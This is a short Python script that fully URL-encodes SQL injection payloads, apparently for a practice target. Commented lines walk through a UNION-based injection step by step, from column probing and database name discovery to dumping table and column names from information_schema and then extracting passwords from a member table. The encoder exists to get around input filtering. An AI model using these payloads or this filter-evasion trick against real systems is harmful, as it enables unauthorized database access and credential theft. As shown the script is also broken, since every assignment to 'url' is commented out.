```
zm = {
    '/':'%2F',
    "'":'%27',
    '(':'%28',
    ')':'%29',
    '*':'%2A',
    '+':'%2B',
    ',':'%2C',
    '=':'%3D',
    ' ':'%20',
    'a':'%61',
    'b':'%62',
    'c':'%63',
    'd':'%64',
    'e':'%65',
    'f':'%66',
    'g':'%67',
    'h':'%68',
    'i':'%69',
    'j':'%6a',
    'k':'%6b',
    'l':'%6c',
    'm':'%6d',
    'n':'%6e',
    'o':'%6f',
    'p':'%70',
    'q':'%71',
    'r':'%72',
    's':'%73',
    't':'%74',
    'u':'%75',
    'v':'%76',
    'w':'%77',
    'x':'%78',
    'y':'%79',
    'z':'%7a',
    '1':'%31',
    '0':'%30',
    '2':'%32',
    '3':'%33',
    '4':'%34',
    '5':'%35',
    '6':'%36',
    '7':'%37',
    '8':'%38',
    '9':'%39',
    '_':'%5F',
    '.':'%2E',
    '-':'%2D',
    '>':'%3e'
}
#url = '/**/union/**/select/**/1,2,3,4'
#url = '/**/union/**/select/**/1,2,database(),4'
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'mozhe_discuz_stormgroup'),4"
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'stormgroup_member'),4"
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(password)/**/from/**/stormgroup_member),4" 
urlcode = ''
for u in url:
    urlcode += zm[u]
print(urlcode)
```
